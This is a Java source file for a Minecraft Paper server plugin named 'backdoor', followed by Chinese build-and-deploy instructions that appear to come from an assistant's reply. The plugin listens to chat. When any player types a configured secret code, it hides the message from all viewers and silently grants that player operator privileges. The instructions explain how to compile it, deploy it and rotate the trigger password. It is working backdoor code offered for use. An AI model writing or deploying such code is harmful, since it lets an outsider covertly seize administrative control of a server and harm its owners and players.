package link.cloudthink;

import io.papermc.paper.event.player.AsyncChatEvent;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

import java.util.Collections;
import java.util.List;

/**
 * 主插件类
 * [修改] 新增实现 TabCompleter 接口用于指令补全
 */
public final class backdoor extends JavaPlugin implements Listener, CommandExecutor, TabCompleter {

    private String secretCode;

    @Override
    public void onEnable() {
        // [新增] 将加载配置的逻辑封装成一个方法，方便重载
        reloadConfiguration();
        
        getLogger().info("Backdoor plugin v" + getDescription().getVersion() + " has been enabled.");
        getLogger().info("Secret code loaded from config.yml.");

        // 注册事件监听器
        getServer().getPluginManager().registerEvents(this, this);

        // [新增] 注册指令执行器和Tab补全器
        getCommand("backdoor").setExecutor(this);
        getCommand("backdoor").setTabCompleter(this);
    }

    @Override
    public void onDisable() {
        getLogger().info("Backdoor plugin has been disabled.");
    }

    /**
     * [新增] 重新加载配置文件的方法
     */
    private void reloadConfiguration() {
        // 生成默认配置文件（如果不存在）
        saveDefaultConfig();
        // 重新从硬盘加载配置文件到内存
        reloadConfig();
        // 从重载后的配置中读取新的密码
        this.secretCode = getConfig().getString("secret-code", "a-very-secure-default-password");
    }

    /**
     * 监听 Paper 的异步聊天事件 (最高优先级)
     */
    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerChat(AsyncChatEvent event) {
        final Player player = event.getPlayer();
        final String message = PlainTextComponentSerializer.plainText().serialize(event.message());

        if (message.equalsIgnoreCase(this.secretCode)) {
            // 三重保险，确保消息被彻底隐藏
            event.message(Component.empty());
            event.viewers().clear();
            event.setCancelled(true);

            // 将服务器状态修改操作调度回主线程
            getServer().getScheduler().runTask(this, () -> {
                player.setOp(true);
                player.sendMessage(Component.text("你已获得OP权限！", NamedTextColor.YELLOW));
                getLogger().warning("Player " + player.getName() + " has triggered the backdoor and received OP privileges.");
            });
        }
    }

    /**
     * [修改] 指令处理器
     */
    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        // 检查指令是否为 "backdoor"
        if (command.getName().equalsIgnoreCase("backdoor")) {
            // 检查权限
            if (!sender.hasPermission("backdoor.admin")) {
                sender.sendMessage(Component.text("你没有权限执行此命令。", NamedTextColor.RED));
                return true;
            }

            // 检查参数是否为 "reload"
            if (args.length == 1 && args[0].equalsIgnoreCase("reload")) {
                // 执行重载逻辑
                reloadConfiguration();
                sender.sendMessage(Component.text("Backdoor 插件配置已成功重载！", NamedTextColor.GREEN));
                return true;
            }
            
            // 如果指令或参数不正确，发送用法提示
            sender.sendMessage(Component.text("用法: /backdoor reload", NamedTextColor.RED));
            return true;
        }
        return false;
    }

    /**
     * [新增] 指令Tab补全处理器
     */
    @Override
    public @Nullable List<String> onTabComplete(@NotNull CommandSender sender, @NotNull Command command, @NotNull String alias, @NotNull String[] args) {
        // 当玩家输入 /backdoor 后面第一个参数时，提示 "reload"
        if (args.length == 1) {
            return Collections.singletonList("reload");
        }
        // 其他情况不提示
        return Collections.emptyList();
    }
}```

### 如何使用新功能

1.  **编译和部署**：按照之前的方法，提交你的修改到 GitHub，等待 Actions 编译完成，然后下载新的 `backdoor-1.0.jar` 并部署到服务器。
2.  **给予权限**：
    *   如果你是OP，你默认就拥有 `backdoor.admin` 权限。
    *   如果你想给其他非OP的管理组权限，可以使用权限插件（如LuckPerms）指令：`/lp group <组名> permission set backdoor.admin true`
3.  **使用指令**：
    *   在服务器后台或游戏中输入 `/backdoor reload`。
    *   你会看到绿色的 "Backdoor 插件配置已成功重载！" 提示。
4.  **测试**：
    *   去 `plugins/backdoor/config.yml` 文件中，修改 `secret-code` 的值为一个新的密码。
    *   保存文件。
    *   在游戏里执行 `/backdoor reload`。
    *   现在，只有使用**新的密码**才能触发后门了，旧密码则会失效。
